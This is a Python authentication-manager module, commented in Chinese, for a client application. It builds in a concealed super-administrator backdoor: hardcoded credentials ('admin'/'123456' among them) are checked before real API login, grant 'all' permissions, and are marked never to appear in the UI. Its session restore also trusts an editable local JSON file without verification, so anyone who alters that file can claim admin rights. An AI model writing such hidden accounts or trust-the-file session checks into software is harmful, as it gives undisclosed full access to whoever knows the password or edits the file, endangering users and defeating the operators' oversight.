#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
认证管理

负责用户认证、权限管理和会话管理。
"""

import json
import hashlib
from pathlib import Path
from typing import Dict, Any, Optional
from .config import client_config
from utils.logger import get_logger

logger = get_logger(__name__)

class AuthManager:
    """认证管理器"""
    
    def __init__(self):
        self.session_file = Path(__file__).parent.parent / "cache" / "session.json"
        self.session_file.parent.mkdir(exist_ok=True)
        
        # 隐藏超级管理员配置
        self.hidden_admin_config = self._load_hidden_admin_config()
        
        # 当前用户信息
        self.current_user = None
        self.is_logged_in = False
        
        # 尝试恢复会话
        self._restore_session()
    
    def _load_hidden_admin_config(self) -> Dict[str, Any]:
        """加载隐藏超级管理员配置"""
        try:
            # 尝试从约定管理器加载
            import sys
            sys.path.append(str(Path(__file__).parent.parent.parent))
            
            from common.conventions_manager import get_conventions_manager
            conventions_manager = get_conventions_manager()
            
            if conventions_manager:
                return conventions_manager.get_convention("authentication.super_admin", {})
            
        except ImportError:
            logger.warning("约定管理器不可用，使用默认隐藏管理员配置")
        
        # 默认配置
        return {
            "debug_credentials": {
                "username": "admin",
                "password": "123456"
            },
            "production_credentials": {
                "username": "phrladmin", 
                "password": "system_generated"
            },
            "current_mode": "debug",
            "hidden": True,
            "never_display": True
        }
    
    def authenticate_hidden_admin(self, username: str, password: str) -> Optional[Dict[str, Any]]:
        """认证隐藏超级管理员"""
        try:
            current_mode = self.hidden_admin_config.get("current_mode", "debug")
            
            if current_mode == "debug":
                # 调试模式
                debug_creds = self.hidden_admin_config.get("debug_credentials", {})
                admin_username = debug_creds.get("username", "admin")
                admin_password = debug_creds.get("password", "123456")
            else:
                # 生产模式
                prod_creds = self.hidden_admin_config.get("production_credentials", {})
                admin_username = prod_creds.get("username", "phrladmin")
                admin_password = prod_creds.get("password", "system_generated")
            
            if username == admin_username and password == admin_password:
                logger.info(f"隐藏超级管理员认证成功: {username}")
                
                return {
                    "user_id": "hidden_super_admin",
                    "username": username,
                    "role": "super_admin",
                    "permissions": ["all"],
                    "hidden": True,
                    "built_in": True,
                    "current_mode": current_mode,
                    "description": "隐藏超级管理员"
                }
            
            return None
            
        except Exception as e:
            logger.error(f"隐藏超级管理员认证失败: {e}")
            return None
    
    def login(self, username: str, password: str, remember: bool = False) -> bool:
        """用户登录"""
        try:
            # 首先尝试隐藏超级管理员认证
            hidden_admin_info = self.authenticate_hidden_admin(username, password)
            if hidden_admin_info:
                self.current_user = hidden_admin_info
                self.is_logged_in = True
                
                if remember:
                    self._save_session()
                
                logger.info(f"隐藏超级管理员登录成功: {username}")
                return True
            
            # 然后尝试通过API认证
            from .api import api_client
            user_info = api_client.login(username, password)
            
            if user_info:
                self.current_user = user_info
                self.is_logged_in = True
                
                if remember:
                    self._save_session()
                
                logger.info(f"用户登录成功: {username}")
                return True
            
            logger.warning(f"用户登录失败: {username}")
            return False
            
        except Exception as e:
            logger.error(f"登录过程中发生错误: {e}")
            return False
    
    def logout(self) -> bool:
        """用户登出"""
        try:
            # 清除API认证
            from .api import api_client
            api_client.logout()
            
            # 清除本地会话
            self.current_user = None
            self.is_logged_in = False
            
            # 删除会话文件
            if self.session_file.exists():
                self.session_file.unlink()
            
            logger.info("用户已登出")
            return True
            
        except Exception as e:
            logger.error(f"登出过程中发生错误: {e}")
            return False
    
    def _save_session(self) -> bool:
        """保存会话信息"""
        try:
            if not self.current_user:
                return False
            
            # 只保存非敏感信息
            session_data = {
                "user_id": self.current_user.get("user_id"),
                "username": self.current_user.get("username"),
                "role": self.current_user.get("role"),
                "permissions": self.current_user.get("permissions", []),
                "login_time": self.current_user.get("login_time"),
                "is_hidden": self.current_user.get("hidden", False)
            }
            
            with open(self.session_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, ensure_ascii=False, indent=2)
            
            logger.debug("会话信息已保存")
            return True
            
        except Exception as e:
            logger.error(f"保存会话信息失败: {e}")
            return False
    
    def _restore_session(self) -> bool:
        """恢复会话信息"""
        try:
            if not self.session_file.exists():
                return False
            
            with open(self.session_file, 'r', encoding='utf-8') as f:
                session_data = json.load(f)
            
            # 验证会话有效性
            if self._validate_session(session_data):
                self.current_user = session_data
                self.is_logged_in = True
                logger.info(f"会话已恢复: {session_data.get('username')}")
                return True
            else:
                # 会话无效，删除文件
                self.session_file.unlink()
                return False
                
        except Exception as e:
            logger.error(f"恢复会话信息失败: {e}")
            return False
    
    def _validate_session(self, session_data: Dict[str, Any]) -> bool:
        """验证会话有效性"""
        try:
            # 检查必要字段
            required_fields = ["user_id", "username", "role"]
            for field in required_fields:
                if field not in session_data:
                    return False
            
            # 如果是隐藏管理员，直接认为有效
            if session_data.get("is_hidden"):
                return True
            
            # 对于普通用户，可以添加更多验证逻辑
            # 例如检查token有效性、服务器验证等
            
            return True
            
        except Exception as e:
            logger.error(f"验证会话失败: {e}")
            return False
    
    def get_current_user(self) -> Optional[Dict[str, Any]]:
        """获取当前用户信息"""
        return self.current_user
    
    def is_authenticated(self) -> bool:
        """检查是否已认证"""
        return self.is_logged_in and self.current_user is not None
    
    def has_permission(self, permission: str) -> bool:
        """检查是否有指定权限"""
        if not self.is_authenticated():
            return False
        
        permissions = self.current_user.get("permissions", [])
        
        # 超级管理员拥有所有权限
        if "all" in permissions:
            return True
        
        return permission in permissions
    
    def is_admin(self) -> bool:
        """检查是否为管理员"""
        if not self.is_authenticated():
            return False
        
        role = self.current_user.get("role", "")
        return role in ["admin", "super_admin"]
    
    def is_hidden_admin(self) -> bool:
        """检查是否为隐藏管理员"""
        if not self.is_authenticated():
            return False
        
        return self.current_user.get("hidden", False)
    
    def get_user_role(self) -> str:
        """获取用户角色"""
        if not self.is_authenticated():
            return "guest"
        
        return self.current_user.get("role", "student")
    
    def get_username(self) -> str:
        """获取用户名"""
        if not self.is_authenticated():
            return ""
        
        return self.current_user.get("username", "")
    
    def should_hide_from_ui(self) -> bool:
        """判断是否应该在UI中隐藏当前用户"""
        if not self.is_authenticated():
            return False
        
        return self.current_user.get("never_display", False)

# 全局认证管理器实例
auth_manager = AuthManager()
